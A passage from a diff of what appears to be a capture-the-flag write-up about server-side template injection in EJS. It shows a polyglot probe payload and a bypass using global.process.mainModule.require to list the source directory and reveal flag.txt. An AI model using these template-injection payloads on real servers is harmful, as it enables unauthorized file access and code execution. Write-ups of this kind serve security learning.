@@ -22,7 +22,8 @@ i then did some googling and found the payload `{{<%[%'"}}%\.` on https://www.im
 
 according to chatgpt this error comes from EJS (embedded javascript)
 
-the payload `<%= require('fs').readdirSync('.') %>` yields an error, 'ReferenceError: ejs:1 >> 1| Fuzzed <%= require('fs').readdirSync('.') %> require is not defined'
+the payload `<%= require('fs').readdirSync('.') %>` yields an error
+'ReferenceError: ejs:1 >> 1 Fuzzed <%= require('fs').readdirSync('.') %> require is not defined'
 
 this suggests that the local environment doesn't have require, this can be circumvented by a payload like `<%= global.process.mainModule.require('fs').readdirSync('.') %>`, which lists all the contents of the source directory: 'Fuzzed Dockerfile,app.js,flag.txt,node_modules,package-lock.json,package.json'
 
